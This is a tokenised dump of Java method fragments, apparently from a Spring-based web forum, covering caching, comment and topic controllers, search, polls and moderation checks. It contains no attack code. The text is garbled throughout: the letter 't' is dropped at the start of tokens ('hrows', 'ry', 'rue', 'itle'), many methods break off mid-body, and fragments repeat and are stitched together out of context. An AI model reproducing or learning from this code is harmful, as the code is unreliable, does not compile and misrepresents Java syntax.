public static User getUser ( Connection con , String name ) hrows SQLException , UserNotFoundException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; User user = new User ( con , name ) ; String shortCacheId = " User?id= " + user . id ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; mcc . storeToCache ( cacheId , user , CACHE_MILLIS ) ; return user ; } 
private static User getUser ( Connection db , int id , boolean useCache ) hrows SQLException , UserNotFoundException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String shortCacheId = " User?id= " + id ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; User res = null ; if ( useCache ) { res = ( User ) mcc . getFromCache ( cacheId ) ; } if ( res = = null ) { res = new User ( db , id ) ; mcc . storeToCache ( cacheId , res , CACHE_MILLIS ) ; } return res ; } 
public String get ( SearchViewer viewer , boolean nocache ) hrows SQLException , UserErrorException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = MemCachedSettings . getId ( viewer . getVariantID ( ) ) ; String res = null ; if ( ! nocache ) { ime = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . getFromCache ( cacheId ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = rue ; } if ( res = = null ) { Connection db = null ; ry { long current = new Date ( ) . getTime ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . storeToCache ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public ModelAndView showComments ( @RequestParam String nick , @RequestParam ( defaultValue = " 0 " ) int offset , HttpServletResponse response ) hrows Exception { ModelAndView mv = new ModelAndView ( " show-comments " ) ; int opics = 50 ; mv . getModel ( ) . put ( " opics " , opics ) ; if ( offset < 0 ) { hrow new ServletParameterException ( " offset<0!? " ) ; } mv . getModel ( ) . put ( " offset " , offset ) ; boolean firstPage = offset = = 0 ; if ( firstPage ) { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 90 * 1000 ) ; } else { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 60 * 1000L ) ; } mv . getModel ( ) . put ( " firstPage " , firstPage ) ; Connection db = null ; String showCommentsId = MemCachedSettings . getId ( " show-comments?id= " + URLEncoder . encode ( nick ) + " &offset= " + offset ) ; ry { db = LorDataSource . getConnection ( ) ; 
public < T > boolean storeToCache ( String key , T value , int expire ) { String s = MemCachedSettings . getId ( key ) ; return MemCachedSettings . getMemCachedClient ( ) . set ( s , value , expire ) ; } 
public < T > boolean storeToCache ( String key , T value ) { String s = MemCachedSettings . getId ( key ) ; return MemCachedSettings . getMemCachedClient ( ) . set ( s , value , 0 ) ; } 
Object getFromCache ( String key ) ; < T > void storeToCache ( String key , T value , int expire ) ; < T > void storeToCache ( String key , T value ) ; } 
< T > void storeToCache ( String key , T value , int expire ) ; < T > void storeToCache ( String key , T value ) ; } 
public < T > void storeToCache ( String key , T value ) { storeToCache ( key , value , 0 ) ; } 
public ModelAndView showComments ( @RequestParam String nick , @RequestParam ( defaultValue = " 0 " ) int offset , HttpServletResponse response ) hrows Exception { ModelAndView mv = new ModelAndView ( " show-comments " ) ; int opics = 50 ; mv . getModel ( ) . put ( " opics " , opics ) ; if ( offset < 0 ) { hrow new ServletParameterException ( " offset<0!? " ) ; } mv . getModel ( ) . put ( " offset " , offset ) ; boolean firstPage = offset = = 0 ; if ( firstPage ) { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 90 * 1000 ) ; } else { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 60 * 1000L ) ; } mv . getModel ( ) . put ( " firstPage " , firstPage ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public static User getUser ( Connection con , String name ) hrows SQLException , UserNotFoundException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; User user = new User ( con , name ) ; String cacheId = " User?id= " + user . id ; mcc . storeToCache ( cacheId , user , CACHE_MILLIS ) ; return user ; } 
private static User getUser ( Connection db , int id , boolean useCache ) hrows SQLException , UserNotFoundException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = " User?id= " + id ; User res = null ; if ( useCache ) { res = ( User ) mcc . getFromCache ( cacheId ) ; } if ( res = = null ) { res = new User ( db , id ) ; mcc . storeToCache ( cacheId , res , CACHE_MILLIS ) ; } return res ; } 
public String get ( SearchViewer viewer , boolean nocache ) hrows SQLException , UserErrorException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = viewer . getVariantID ( ) ; String res = null ; if ( ! nocache ) { ime = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . getFromCache ( cacheId ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = rue ; } if ( res = = null ) { Connection db = null ; ry { long current = new Date ( ) . getTime ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . storeToCache ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public boolean evaluate ( Object o ) { return isBox ( ( String ) o ) ; } 
public boolean isResolvable ( ) { return resolvable ; } 
public void resolveMessage ( Connection db , boolean b ) hrows SQLException { PreparedStatement pstMsgbase = db . prepareStatement ( " UPDATE topics SET resolved=?,lastmod=CURRENT_TIMESTAMP WHERE id=? " ) ; pstMsgbase . setBoolean ( 1 , b ) ; pstMsgbase . setInt ( 2 , msgid ) ; pstMsgbase . executeUpdate ( ) ; } 
public String get ( SearchViewer viewer , boolean nocache ) hrows SQLException , UserErrorException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = viewer . getVariantID ( ) ; String res = null ; if ( ! nocache ) { ime = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . getFromCache ( cacheId ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = rue ; } if ( res = = null ) { Connection db = null ; ry { long current = new Date ( ) . getTime ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . storeToCache ( cacheId , res , 15 * 60 * 1000 ) ; } return res ; } 
private static void createReplyTo ( Integer replyTo , Map < String , Object > params , Connection db ) hrows SQLException , MessageNotFoundException , AccessViolationException { if ( replyTo ! = null & & replyTo > 0 ) { Comment onComment = new Comment ( db , replyTo ) ; 
private static String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; form . setOutputLorcode ( rue ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " ex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
private ModelAndView prepareModel ( Connection db , Message message ) hrows SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " message " , message ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( editInfoList ! = null ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
public ModelAndView loginForm ( ) { return new ModelAndView ( " login-form " ) ; } 
public ModelAndView activateForm ( ) { return new ModelAndView ( " activate " ) ; } 
public ModelAndView showNews ( @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " section " , required = false ) Integer sectionid , @RequestParam ( value = " group " , required = false ) Integer groupid , @RequestParam ( value = " ag " , required = false ) String ag , @RequestParam ( value = " offset " , required = false ) Integer offset , HttpServletResponse response ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " view-news.jsp " ) ; StringBuilder urlParams = new StringBuilder ( ) ; if ( sectionid ! = null ) { urlParams . append ( " section= " + Integer . oString ( sectionid ) ) ; } if ( ag ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( '&' ) ; } urlParams . append ( " ag= " + URLEncoder . encode ( ag ) ) ; } if ( groupid ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( '&' ) ; } urlParams . append ( " group= " + Integer . oString ( groupid ) ) ; } params . put ( " params " , urlParams ) ; Connection db = null ; ry { if ( month = = null ) { 
public ModelAndView showUserTopicsNew ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " /people/ " + nick + '/' ) ; params . put ( " whoisLink " , " /people/ " + nick + '/' + " profile " ) ; TODO params.put("archiveLink", "/people/"+nick+"/archive/"); Connection db = null; try { response.setDateHeader("Expires", System.currentTimeMillis() + 60 * 1000); 
public View showUserTopics ( @RequestParam ( " nick " ) String nick , @RequestParam ( value = " output " , required = false ) String output ) { if ( output ! = null ) { return new RedirectView ( " /people/ " + nick + " /?output=rss " ) ; } return new RedirectView ( " /people/ " + nick + '/' ) ; } 
public View oldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) hrows Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . oString ( offset ) ) ; } if ( year ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . oString ( year ) + '/' + Integer . oString ( month ) ) ; } if ( groupId ! = null ) { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; Group group = new Group ( db , groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + '/' ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
public ModelAndView galleryArchive ( @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) hrows Exception { ModelAndView mv = showNews ( month , year , Section . getSection ( section ) , null , null , null , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public List < User > getNewUsers ( Connection db ) hrows SQLException , UserNotFoundException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT id FROM users where regdate IS NOT null " + " AND regdate > CURRENT_TIMESTAMP - interval '3 days' ORDER BY regdate " ) ; List < User > list = new ArrayList < User > ( ) ; while ( rs . next ( ) ) { list . add ( User . getUser ( db , rs . getInt ( " id " ) ) ) ; } st . close ( ) ; return list ; } 
public ModelAndView removeUserpic ( HttpServletRequest request , @RequestParam ( " id " ) int id ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not autorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private GalleryItem createGalleryItem ( ResultSet rs ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = properties . getProperty ( " HTMLPathPrefix " ) ; item . setHtmlPath ( htmlPath ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public TopTenMessageDTO mapRow ( ResultSet rs , int i ) hrows SQLException { TopTenMessageDTO result = new TopTenMessageDTO ( ) ; result . setUrl ( Section . getSectionLink ( rs . getInt ( " section " ) ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; result . setTitle ( rs . getString ( " itle " ) ) ; result . setLastmod ( rs . getTimestamp ( " lastmod " ) ) ; result . setAnswers ( rs . getInt ( " c " ) ) ; return result ; } 
private static void check ( String domain , String msgid ) hrows StorageException { if ( ! DOMAIN_CHECK_RE . isMatch ( domain ) ) { hrow new StorageBadDomainException ( domain ) ; } if ( ! NAME_CHECK_RE . isMatch ( msgid ) ) { hrow new StorageBadMsgidException ( msgid ) ; 
public static String readfile ( String filename ) hrows IOException { StringBuilder out = new StringBuilder ( ) ; BufferedReader in = new BufferedReader ( new InputStreamReader ( new FileInputStream ( filename ) , " KOI8-R " ) ) ; char [ ] buf = new char [ 8192 ] ; int i ; while ( ( i = in . read ( buf , 0 , buf . length ) ) > - 1 ) { if ( i > 0 ) { out . append ( buf , 0 , i ) ; } } in . close ( ) ; return out . oString ( ) ; } 
public boolean setBoolean ( String prop , String value ) hrows UtilException { if ( value = = null ) { return setBoolean ( prop , false ) ; } if ( " on " . equals ( value ) ) { return setBoolean ( prop , rue ) ; } return false ; } 
public String next ( ) { if ( ! hasNext ( ) ) { hrow new NoSuchElementException ( ) ; } if ( str . charAt ( index ) = = '&' ) { StringBuilder buf = new StringBuilder ( ) ; 
public String show ( Connection db ) hrows SQLException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 | | ( userTopic & & username . length ( ) > 0 ) ) { select . append ( " , topics " ) ; } if ( section ! = 0 ) { select . append ( " , groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; if ( userTopic ) { select . append ( " AND topics.userid= " ) . append ( user . getId ( ) ) ; select . append ( " AND topics.id = topic " ) ; } else { select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public ModelAndView showForm ( HttpSession session , HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; if ( ! Template . isSessionAuthorized ( session ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Template mpl = Template . getTemplate ( request ) ; params . put ( " msgid " , msgid ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView deleteComments ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( " reason " ) String reason , @RequestParam ( value = " bonus " , defaultValue = " 0 " ) int bonus , HttpSession session ) hrows Exception { if ( bonus < 0 | | bonus > 20 ) { hrow new BadParameterException ( " incorrect bonus value " ) ; } if ( ! Template . isSessionAuthorized ( session ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid , HttpSession session ) hrows Exception { if ( ! Template . isSessionAuthorized ( session ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView deleteMessage ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( " reason " ) String reason , @RequestParam ( value = " bonus " , defaultValue = " 0 " ) int bonus , HttpServletRequest request ) hrows Exception { HttpSession session = request . getSession ( ) ; if ( ! Template . isSessionAuthorized ( session ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public User getCurrentUser ( Connection db ) hrows SQLException , UserNotFoundException { if ( ! isSessionAuthorized ( ) ) { return null ; } if ( currentUser ! = null ) { return currentUser ; } currentUser = User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; return currentUser ; } 
public static User getCurrentUser ( Connection db , HttpSession session ) hrows SQLException , UserNotFoundException { if ( ! isSessionAuthorized ( session ) ) { return null ; } return User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; } 
public static int getId ( Connection db , int userid , int opic ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT id FROM memories WHERE userid= " + userid + " AND topic= " + opic ) ; if ( ! rs . next ( ) ) { return 0 ; 
public View add ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public View remove ( HttpServletRequest request , @RequestParam ( " id " ) int id ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNew ( int section , WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , int page , String filter , String groupName , int msgid ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public void initCurrentUser ( Connection db ) hrows UserNotFoundException , SQLException { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null ) { return ; } currentUser = User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; } 
public User getCurrentUser ( ) hrows SQLException , UserNotFoundException { if ( ! isSessionAuthorized ( ) ) { return null ; } if ( currentUser = = null ) { hrow new IllegalStateException ( " currentUser==null!? Please call initCurrentUser() first " ) ; } return currentUser ; } 
public ModelAndView showController ( @RequestParam ( " msgid " ) int msgid , HttpServletRequest request ) hrows Exception { Connection db = null ; Template mpl = Template . getTemplate ( request ) ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView deleteComments ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( " reason " ) String reason , @RequestParam ( value = " bonus " , defaultValue = " 0 " ) int bonus , HttpSession session , HttpServletRequest request ) hrows Exception { if ( bonus < 0 | | bonus > 20 ) { hrow new BadParameterException ( " incorrect bonus value " ) ; } if ( ! Template . isSessionAuthorized ( session ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid , HttpSession session , HttpServletRequest request ) hrows Exception { if ( ! Template . isSessionAuthorized ( session ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView deleteMessage ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( " reason " ) String reason , @RequestParam ( value = " bonus " , defaultValue = " 0 " ) int bonus , HttpServletRequest request ) hrows Exception { HttpSession session = request . getSession ( ) ; if ( ! Template . isSessionAuthorized ( session ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public static List < PreparedComment > prepare ( Connection db , CommentList comments , List < Comment > list ) hrows UserNotFoundException , SQLException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( new PreparedComment ( db , comments , comment ) ) ; } return commentsPrepared ; } 
private static void createReplyTo ( Integer replyTo , Map < String , Object > params , Connection db ) hrows SQLException , MessageNotFoundException , AccessViolationException , UserNotFoundException { if ( replyTo ! = null & & replyTo > 0 ) { Comment onComment = new Comment ( db , replyTo ) ; 
public ModelAndView showEditInfo ( @PathVariable ( " id " ) int msgid ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private static String getProcessedMessage ( Connection db , Comment comment ) hrows SQLException { if ( comment . isLorcode ( ) ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; 
public int saveNewMessage ( Connection db , String remoteAddr , String userAgent , String message ) hrows SQLException { PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; ry { allocation MSGID 
private static String getProcessedMessage ( Connection db , Comment comment ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT message, bbcode FROM msgbase WHERE id= " + comment . getId ( ) ) ; rs . next ( ) ; String ext = rs . getString ( " message " ) ; boolean bbcode = rs . getBoolean ( " bbcode " ) ; rs . close ( ) ; st . close ( ) ; if ( bbcode ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; 
private static String getProcessedMessage ( Connection db , Comment comment , String message ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; return proc . preparePostText ( db , message ) ; } 
private static String getProcessedMessage ( Connection db , String message ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; return proc . preparePostText ( db , message ) ; } 
public ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Template mpl = Template . getTemplate ( request ) ; boolean showDeleted = request . getParameter ( " deleted " ) ! = null ; params . put ( " showDeleted " , showDeleted ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView forumArchive ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @PathVariable int year , @PathVariable int month , HttpServletRequest request ) hrows Exception { return forum ( groupName , offset , false , request , year , month ) ; } 
public ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request ) hrows Exception { return forum ( groupName , offset , lastmod , request , null , null ) ; } 
private ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request , Integer year , Integer month ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Template mpl = Template . getTemplate ( request ) ; boolean showDeleted = request . getParameter ( " deleted " ) ! = null ; params . put ( " showDeleted " , showDeleted ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private int getArchiveCount ( Connection db , int groupid , int year , int month ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT c FROM monthly_stats WHERE groupid= " + groupid + " AND year= " + year + " AND month= " + month ) ; if ( ! rs . next ( ) ) { return 0 ; 
public ModelAndView archiveList ( int sectionid ) hrows Exception { return archiveList ( sectionid , null ) ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView forumArchive ( @PathVariable String group ) hrows Exception { return archiveList ( Section . SECTION_FORUM , group ) ; } 
public View galleryArchiveOld ( @RequestParam ( " section " ) int id , HttpServletResponse response ) hrows Exception { String link = Section . getArchiveLink ( id ) ; if ( link = = null ) { response . sendError ( 404 , " No archive for this section " ) ; return null ; } return new RedirectView ( link ) ; } 
public boolean isMultiSelect ( ) { return multiSelect ; } 
public ModelAndView editVote ( HttpServletRequest request , @RequestParam int msgid , @RequestParam int id , @RequestParam String itle , @RequestParam ( defaultValue = " false " ) boolean multiSelect ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView vote ( ServletRequest request , @RequestParam ( " vote " ) int [ ] votes , @RequestParam ( " voteid " ) int voteid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public Poll get ( ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public Message get ( ) hrows SQLException , MessageNotFoundException { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
protected < T > T getFromCache ( CacheProvider cacheProvider , GetCommand < T > callback ) hrows Exception { return getFromCache ( cacheProvider , getCacheKey ( ) , callback ) ; } 
protected < T > T getFromCache ( CacheProvider cacheProvider , String key , GetCommand < T > callback ) hrows Exception { @SuppressWarnings ( " unchecked " ) T result = ( T ) cacheProvider . getFromCache ( key ) ; if ( result = = null ) { result = callback . get ( ) ; cacheProvider . storeToCache ( key , result , getExpiryTime ( ) ) ; } return result ; } 
public static int createPoll ( Connection db , List < String > pollList , boolean multiSelect ) hrows SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id, multiselect) values (?,?) " ) ; pst . setInt ( 1 , voteid ) ; pst . setBoolean ( 2 , multiSelect ) ; pst . executeUpdate ( ) ; ry { Poll poll = new Poll ( db , voteid ) ; for ( String variant : pollList ) { if ( variant . rim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } } catch ( PollNotFoundException ex ) { hrow new RuntimeException ( ex ) ; } return voteid ; } 
public static List < PreparedComment > prepare ( Connection db , CommentList comments , List < Comment > list ) hrows UserNotFoundException , SQLException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( new PreparedComment ( db , comments , comment ) ) ; } return commentsPrepared ; } 
public ModelAndView showUserFavs ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " /people/ " + nick + " /favs " ) ; params . put ( " whoisLink " , " /people/ " + nick + '/' + " profile " ) ; Connection db = null ; ry { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
public ModelAndView mainPage ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { if ( mpl . isSessionAuthorized ( ) ) { 
